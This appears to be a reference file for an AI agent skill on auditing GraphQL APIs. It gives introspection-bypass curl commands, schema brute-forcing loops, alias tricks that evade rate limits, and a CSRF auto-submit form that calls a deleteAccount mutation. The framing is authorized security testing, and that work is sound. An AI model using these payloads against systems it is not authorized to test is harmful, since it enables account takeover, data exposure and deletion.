# GraphQL Audit — Deep Workflows

Companion to SKILL.md: full payloads, introspection bypass ladder, batching
detection, and per-resolver authorization testing.

## Full introspection query (compact, works on most engines)

```json
{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name type { kind name ofType { kind name } } } type { kind name ofType { kind name ofType { kind name } } } isDeprecated deprecationReason } inputFields { name type { kind name ofType { kind name } } } interfaces { name } enumValues(includeDeprecated: true) { name } possibleTypes { name } } directives { name locations args { name type { kind name ofType { kind name } } } } } }"}
```

## Introspection bypass ladder (when blocked)

Try in order; stop at first success:

```bash
ENDPOINT=https://target.example.com/api/graphql

# 1) Content-type variants
curl -s -X POST $ENDPOINT -H "Content-Type: application/graphql" \
  --data-binary '{"__schema{types{name}}"}'

# 2) GET-based
curl -s -G $ENDPOINT --data-urlencode 'query={__schema{types{name}}}'

# 3) Form-encoded POST
curl -s -X POST $ENDPOINT -d 'query={__schema{types{name}}}'

# 4) Keyword obfuscation that some parsers accept
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }","operationName":"IntrospectionQuery"}'
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '{"query":"query __Introspection___ { __schema { types { name } } }"}'

# 5) Unicode/whitespace tricks in field names (engine-dependent)
#    e.g. \u005f\u005f schema escaping for underscore-prefixed fields
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '{"query":"{\\u005f\\u005fschema{types{name}}}"}'
```

## Schema recovery without introspection

```bash
# 1) Trigger suggestion errors to leak names
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '{"query":"{ userr { id } }"}'
# -> "Cannot query field \"userr\"... Did you mean \"user\"?"

# 2) Feed suggestions to clairvoyance (offline schema rebuild)
wsl clairvoyance -o recovered_schema.json -t id email token \
  -u https://target.example.com/api/graphql

# 3) Field brute force via __typename probing on guessed objects
for f in user users me account order orders admin internalUser; do
  R=$(curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $f { __typename } }\"}")
  echo "$f => $R"
done
```

Use a wordlist of common field names; keep request rate low.

## Authorization testing checklist (per operation)

For every query/mutation in the schema:

```text
[ ] Anonymous call            -> should fail with auth error
[ ] User A requesting B's ID  -> should fail / return only A's data
[ ] Role downgrade            -> low-priv token against admin ops
[ ] Nested traversal          -> A's query reaching B through relations:
      query { orders(mine:true) { items { product { ownerReviews { author { email } } } } } }
[ ] Input-object overreach    -> pass other users' IDs inside input lists
[ ] Mutation cross-account    -> update/delete with foreign object IDs
```

Log each as PASS/FAIL; any FAIL = finding candidate. Verify twice before
writing it up (lesson: endpoints can 404 later or be WAF-blocked).

## Batching & alias abuse — detection with minimal footprint

```bash
# Detect JSON-array batching support (ONE request)
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'
# Two results => batching enabled.

# Detect alias multiplexing (ONE request)
curl -s -X POST $ENDPOINT -H "Content-Type: application/json" \
  -d '{"query":"mutation { a1:login(u:\"x\",p:\"y\"){token} a2:login(u:\"x\",p:\"z\"){token} }"}'
```

If rate limits are enforced per-HTTP-request rather than per-operation,
aliases bypass them. Document with 2-3 attempts max — never brute-force at
volume through aliases.

## Depth/circularity check (prove limit existence, not exhaustion)

```graphql
query {
  user(id:"me") { posts { author { posts { author { name } } } } }
}
```
Add one nesting level per attempt until the engine rejects. Record the
max depth accepted. If unlimited depth succeeds at level >= 8, note as
missing depth limiting — do NOT push further.

## Subscriptions (WebSocket)

```javascript
// ws endpoint often mirrors HTTP path
new WebSocket('wss://target.example.com/api/graphql', 'graphql-ws');
// then send:
{"type":"connection_init"}
{"id":"1","type":"start","payload":{"query":"subscription { newOrder { id total userId } }"}}
```

Test unauthenticated connect, cross-user channel guessing, and missing
auth on `connection_init` payload tokens.

## CSRF against cookie-authenticated GraphQL

```html
<form method="POST" action="https://target.example.com/api/graphql">
  <input name='{"query":"mutation{deleteAccount(id:\"victim\")}","x":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Works if server accepts form-encoded bodies and relies on ambient cookies.
Verify with your own two accounts only.

## Common endpoint wordlist (quick probe)

```text
/graphql /graphiql /api /api/graphql /api/graphiql /app/graphql
/v1/graphql /v2/graphql /v3/graphql /gql /query /explorer
/console /playground /altair /graphql/dev /internal/graphql
/service/graphql /wp-json/graphql /index.php?graphql=true
```

`scripts/graphql_recon.py --discover` automates this list with one request
each and stops on first valid `{__typename}` response.
